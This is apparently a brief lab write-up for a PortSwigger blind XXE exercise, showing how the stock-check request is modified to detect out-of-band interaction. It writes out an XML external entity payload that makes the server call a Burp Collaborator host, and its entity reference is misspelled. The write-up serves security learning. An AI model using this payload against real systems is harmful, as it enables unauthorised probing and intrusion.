
![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/0e97371a-4949-4541-879a-24bb52d7404d)

### Solution

we used the check stock feature

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/f3ecc276-fbed-45cd-b412-5861506de66c)

Insert the following external entity definition in between the XML declaration and the stockCheck element

`<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>`

replace the burp collaborator subdomain wiht the corresponding value

enter `xxe;` at the product id section

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/cb4397eb-013a-4662-ad22-5093d88afc70)

now check in the burp poll sction, we can see that dns and http request was generated due to our payload

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/a9864efe-9913-429c-8ba3-5c241e4370f5)

lab solved

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/3a4f8197-ed58-4bf1-b700-943f1beeba07)

